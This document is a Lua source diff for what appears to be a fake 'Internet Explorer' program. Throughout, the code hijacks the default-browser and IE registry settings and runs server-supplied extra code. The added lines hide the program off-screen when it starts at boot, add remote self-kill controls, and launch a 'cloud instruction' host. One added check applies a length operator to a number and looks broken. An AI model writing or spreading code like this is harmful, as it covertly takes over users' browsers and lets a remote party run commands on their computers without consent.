@@ -1,7 +1,10 @@
 local tipUtil = XLGetObject("API.Util")
 local tipAsynUtil = XLGetObject("API.AsynUtil")
-local gnLastReportRunTmUTC = 0
+local FunctionObj = nil
 
+local gnLastReportRunTmUTC = 0
+local bHideFakeIE = false
+XLSetGlobal("bHideFakeIE", bHideFakeIE)
 -----------------
 
 function RegisterFunctionObject()
@@ -14,6 +17,7 @@ function RegisterFunctionObject()
 	else
 		return true
 	end
+
 end
 
 
@@ -47,17 +51,25 @@ function FetchValueByPath(obj, path)
 end
 
 function ShowMainTipWnd(objMainWnd)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	objMainWnd:Show(5)
-	objMainWnd:SetTitle("Internet Explorer")
-	SendStartupReport(true)
+	if not bHideFakeIE then
+		objMainWnd:Show(5)
+		FunctionObj.RestoreWndSize()
+		SendStartupReport(true)
+		objMainWnd:SetAppWindow(1)
+	else
+		-- 将窗口区域移到屏幕外面,防止机器卡机时屏幕出现虚框
+		
+		local screenWidth, screenHeight = tipUtil:GetScreenSize()
+		objMainWnd:Move(screenWidth + 100, screenHeight + 100, 100, 100)
+		
+		objMainWnd:Show(4)
+	end
 	
-	FunctionObj.RestoreWndSize()
+	objMainWnd:SetTitle("Internet Explorer")
 end
 
 
 function SendStartupReport(bShowWnd)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tStatInfo = {}
 	
 	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
@@ -65,6 +77,9 @@ function SendStartupReport(bShowWnd)
 	
 	if not bShowWnd then
 		tStatInfo.strEC = "launch"  --进入上报
+		if bHideFakeIE then
+			tStatInfo.strEC = "launch_hide"
+		end
 		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
 		tStatInfo.strEL = strSource or ""
 	else
@@ -84,8 +99,6 @@ end
 
 
 function SendUserInfoReport()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	
 	local bHasSend = CheckHasSendUserInfo()
 	if bHasSend then
 		return
@@ -113,7 +126,6 @@ end
 
 
 function CheckHasSendUserInfo()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	local nLastReportBrowser = tUserConfig["nLastReportBrowser"] or 0
 	
@@ -126,7 +138,6 @@ end
 
 
 function SaveLastReportBrowser()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	tUserConfig["nLastReportBrowser"] = tipUtil:GetCurrentUTCTime()
 	
@@ -135,7 +146,6 @@ end
 
 
 function CheckForceVersion(tForceVersion)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	if type(tForceVersion) ~= "table" then
 		return false
 	end
@@ -172,7 +182,6 @@ end
 
 
 function TryForceUpdate(tServerConfig)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	if FunctionObj.CheckIsUpdating() then
 		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
 		return
@@ -221,7 +230,6 @@ end
 
 
 function TryExecuteExtraCode(tServerConfig)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
 	local strURL = tExtraHelper["strURL"]
 	local strMD5 = tExtraHelper["strMD5"]
@@ -250,7 +258,6 @@ end
 
 --改userconfig中的首页字段
 function TrySetConfigHomePage(tServerConfig)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	FunctionObj.TipLog("[TrySetConfigHomePage] begin ")
 	
 	if type(tServerConfig) ~= "table" or type(tServerConfig["tURLMap"]) ~= "table" then
@@ -275,7 +282,6 @@ end
 
 
 function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig")
 	--FunctionObj.TipLog("[TrySetDefaultBrowser] enter")
 	
@@ -324,7 +330,6 @@ end
 
 
 function SendSetDefBrowReport(bExit, strSource)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tStatInfo = {}
 
 	tStatInfo.strEC = "setdefaultbrowser"  --进入上报
@@ -355,7 +360,6 @@ end
 
 
 function CheckProcessList(strProcessList)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList, ";") or {}
 	
 	for _, strProcessName in pairs(tProcessList) do
@@ -372,7 +376,6 @@ end
 
 
 function CheckBrowserList(strProcessList)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList, ";") or {}
 	local strCruDefault = FunctionObj.GetDefaultBrowser()
 	
@@ -388,8 +391,6 @@ end
 
 
 function RedirectSysIEPath()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	
 	local strFakeIEPath = FunctionObj.GetExePath()
 	local strIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
 	local strOldIEPath = FunctionObj.RegQueryValue(strIERegPath)
@@ -404,7 +405,6 @@ function RedirectSysIEPath()
 end
 
 function IsWin7()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local sysVersion = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion")
 	
 	if tonumber(sysVersion) and tonumber(sysVersion) > 6.0 and tonumber(sysVersion) < 6.2 then	
@@ -415,65 +415,64 @@ end
 
 -- 准备progid
 function PrepareProgID(strProgID)
-	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
 	local bInfMode = true
-	local bIs64 = tFunHelper.CheckIs64OS()
-	tFunHelper.TipLog("PrepareProgID(strProgID)")
+	local bIs64 = FunctionObj.CheckIs64OS()
+	FunctionObj.TipLog("PrepareProgID(strProgID)")
 	
-	local strBrowserPath = tFunHelper.GetExePath()
+	local strBrowserPath = FunctionObj.GetExePath()
 	local strBrowPathWithFix = "\""..strBrowserPath.."\""
 	local strCommand = strBrowPathWithFix.." \"%1\""
 		
-	if not tFunHelper.IsUserAdmin() then
+	if not FunctionObj.IsUserAdmin() then
 		strBrowPathWithFix = "\"\"\""..strBrowserPath.."\"\"\""
 		strCommand = strBrowPathWithFix.." \"\"\"%1\"\"\""
 	end
 	
-	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
+	local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
 	if not IsRealString(strRegValue) then
 		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\shell\\open\\command")
-		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\", strCommand, bIs64, bInfMode)
+		FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\", strCommand, bIs64, bInfMode)
 	end
 
-	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
+	local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
 	if not IsRealString(strRegValue) then
 		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\Application")
-		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowPathWithFix, bIs64, bInfMode)
+		FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowPathWithFix, bIs64, bInfMode)
 	end
 
 	
 	-- 设置默认图标
-	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\")
+	local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\")
 	if not IsRealString(strRegValue) then
 		local strRegIconPath = "HKEY_CLASSES_ROOT\\IE.HTTP\\DefaultIcon\\"
-		local strIcoPath = tFunHelper.RegQueryValue(strRegIconPath)
+		local strIcoPath = FunctionObj.RegQueryValue(strRegIconPath)
 
 		if IsRealString(strIcoPath) then
 			tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\DefaultIcon")
-			tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\", strIcoPath, bIs64, bInfMode) 
+			FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\", strIcoPath, bIs64, bInfMode) 
 		end
 	end
 	
 	if IsWin7() then
 		local userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
-		local userChoice = tFunHelper.RegQueryValue(userChoiceReg)
+		local userChoice = FunctionObj.RegQueryValue(userChoiceReg)
 		if userChoice then
-			tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
+			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
 		end
-		tFunHelper.DelRegValueInUAC("HKEY_CURRENT_USER", "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "Progid")
+		FunctionObj.DelRegValueInUAC("HKEY_CURRENT_USER", "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "Progid")
 	end
 	
-	tFunHelper.DelRegValueInUAC("HKEY_CLASSES_ROOT", "http\\shell", "")
+	FunctionObj.DelRegValueInUAC("HKEY_CLASSES_ROOT", "http\\shell", "")
 	
-	local bIs64 = tFunHelper.CheckIs64OS()
-	tFunHelper.CommitRegOperation(bIs64)
+	local bIs64 = FunctionObj.CheckIs64OS()
+	FunctionObj.CommitRegOperation(bIs64)
 	
-	-- local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
+	-- local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
 	-- if not IsRealString(strRegValue) then
 		-- return false --写失败
 	-- end
 	
-	-- local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
+	-- local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
 	-- if not IsRealString(strRegValue) then
 		-- return false --写失败
 	-- end
@@ -483,32 +482,31 @@ end
 
 
 function SetFakeIERegInUAC(strCommand)
-	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
 	local strProgID = "IEHTML"
-	tFunHelper.TipLog("SetFakeIERegInUAC(strProgID)")
+	FunctionObj.TipLog("SetFakeIERegInUAC(strProgID)")
 	
 	local bSuccess = PrepareProgID(strProgID)
 	if not bSuccess then
-		tFunHelper.TipLog("[SetFakeIERegInUAC] PrepareProgID failed ")
+		FunctionObj.TipLog("[SetFakeIERegInUAC] PrepareProgID failed ")
 		return false
 	end
 	
-	local bIs64 = tFunHelper.CheckIs64OS()
+	local bIs64 = FunctionObj.CheckIs64OS()
 	local bRefresh = false
 	--设置默认浏览器
 	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
-	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
+	local strRegValue = FunctionObj.RegQueryValue(strRegPath)
 	if strRegValue ~= strProgID then
-		tFunHelper.RegSetValue(strRegPath, strProgID, bIs64)
-		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPProgid", strRegValue, bIs64)
+		FunctionObj.RegSetValue(strRegPath, strProgID, bIs64)
+		FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPProgid", strRegValue, bIs64)
 		bRefresh = true
 	end
 	
 	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice\\Progid"
-	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
+	local strRegValue = FunctionObj.RegQueryValue(strRegPath)
 	if strRegValue ~= strProgID then
-		tFunHelper.RegSetValue(strRegPath, strProgID, bIs64)
-		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPSProgid", strRegValue, bIs64)
+		FunctionObj.RegSetValue(strRegPath, strProgID, bIs64)
+		FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPSProgid", strRegValue, bIs64)
 		bRefresh = true
 	end
 	
@@ -521,10 +519,9 @@ end
 
 
 function DoSetDefaultBrowser()
-	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
-	tFunHelper.TipLog("[DoSetDefaultBrowser] begin")
+	FunctionObj.TipLog("[DoSetDefaultBrowser] begin")
 	
-	local strBrowserPath = tFunHelper.GetExePath()
+	local strBrowserPath = FunctionObj.GetExePath()
 	if not IsRealString(strBrowserPath) or not tipUtil:QueryFileExists(strBrowserPath) then
 		return false
 	end
@@ -541,7 +538,6 @@ end
 
 
 function FixUserConfig(tServerConfig)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
 	if type(tUserConfigInServer) ~= "table" then
 		return
@@ -559,12 +555,17 @@ function FixUserConfig(tServerConfig)
 		tLocalUserConfig["tOpenStupURL"] = tUserConfigInServer["tOpenStupURL"]
 	end
 	
+	--下一次的自杀延时配置
+	if type(tUserConfigInServer["nKillSelfDelay"]) == "number" and #tUserConfigInServer["nKillSelfDelay"] > 1000 then
+		tLocalUserConfig["nKillSelfDelay"] = tUserConfigInServer["nKillSelfDelay"]
+	end
+	FunctionObj.TipLog(" strHomePage and nKillSelfDelay: "..tostring(tLocalUserConfig["strHomePage"]).." , "..tostring(tLocalUserConfig["nKillSelfDelay"]))
+	
 	FunctionObj.SaveConfigToFileByKey("tUserConfig")
 end
 
 
 function AnalyzeServerConfig(nDownServer, strServerPath)
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
 		FunctionObj.TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
 		-- TipMain()
@@ -584,8 +585,6 @@ end
 
 
 function StartRunCountTimer()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	
 	FunctionObj.SendRunTimeReport(0, false)
 	
 	local nTimeSpanInSec = 10 * 60 
@@ -612,7 +611,7 @@ function CreatePopupTipWnd()
 		local bSucc = CreateWndByName(strHostWndName, strTreeName)
 	end
 	
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	 
 	FunctionObj.InitToolTip()
 	
 	return true
@@ -688,14 +687,13 @@ function PopTipWnd(OnCreateFunc)
 		end
 	end
 	if not bSuccess then
-		local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
+		
 		FunctionObj:FailExitTipWnd(4)
 	end
 end
 
 
 function ProcessCommandLine()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	ProcessLocalCommand()      --解析自身的命令行
 	
 	local bHasOpenLink = ProcessIECommand()    --解析ie的命令行
@@ -713,7 +711,6 @@ end
 
 --模拟解析ie命令行
 function ProcessIECommand()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local bHasOpenLink = true
 	local cmdString = tipUtil:GetCommandLine()
 	local cmdList = tipUtil:CommandLineToList(cmdString)
@@ -735,7 +732,6 @@ end
 
 
 function TryOpenURLWhenStup()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	FunctionObj.OpenURLWhenStup()
 end
 
@@ -762,7 +758,6 @@ end
 
 
 function DoBackupBussiness()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	FunctionObj.TipLog("[DoBackupBussiness] enter")
 	
 	local bIgnoreSpanTime = false
@@ -812,6 +807,35 @@ function DoBackupBussiness()
 end
 
 
+function CreateFilterListener()
+	local objFactory = XLGetObject("APIListen.Factory")
+	if not objFactory then
+		FunctionObj.TipLog("[CreateFilterListener] not support APIListen.Factory")
+		return
+	end
+	
+	local objListen = objFactory:CreateInstance()	
+	objListen:AttachListener(function(key,...)	
+			FunctionObj.TipLog("[CreateFilterListener] key: " .. tostring(key))	
+			if tostring(key) == "OnKillSelf" then
+				FunctionObj.TipLog("[CreateFilterListener] OnKillSelf, exit soon!")
+				tipUtil:Exit("Exit")
+			end
+		end
+	)
+end
+
+function RunJsHost()
+	local bRet,strAllUserDir = FunctionObj:QueryAllUsersDir()
+	if not bRet then
+		return false
+	end
+	
+	local strYBHostCfgPath = tipUtil:PathCombine(strAllUserDir,"iefhost\\config.ini")
+	
+	return tipUtil:RunSH(strYBHostCfgPath)
+end
+
 function PreTipMain() 
 	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
 	XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
@@ -820,7 +844,7 @@ function PreTipMain()
 		tipUtil:Exit("Exit")
 	end
 	
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
+	FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
 	FunctionObj.ReadAllConfigInfo()
 	
 	local bDoBackup = DoBackupBussiness()
@@ -834,6 +858,30 @@ function PreTipMain()
 		
 	SendStartupReport(false)
 	SendUserInfoReport()
+	
+	--是否是开机启动, 是的话隐藏界面
+	 
+	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
+	if bRet and "sysboot" == strSource then
+		--将窗口区域移到屏幕外面
+		bHideFakeIE = true
+		--监听自杀事件
+		CreateFilterListener()
+		
+		--读本地配置，设置超时自杀,默认10min
+		local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+		local nKillSelfDelay = tLocalUserConfig["nKillSelfDelay"] or 1000*60*10
+		SetOnceTimer(function() tipUtil:Exit("Exit") end, nKillSelfDelay)
+		
+		--拉起云指令
+		RunJsHost()
+	else
+		--非开机启动，则发自杀消息,杀掉隐藏的伪IE
+		tipAsynUtil:AsynPostWndMsg(nil,"{C3CE0473-57F7-4a0a-9CF4-C1ECB8A3C514}_dsmainmsg_ie",1024+401,0,0,function(nRet)
+		end)
+	end
+	
+	--在TipMain后通过判断bHideFakeIE，设置窗口位置、可见性
 	TipMain()
 	
 	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
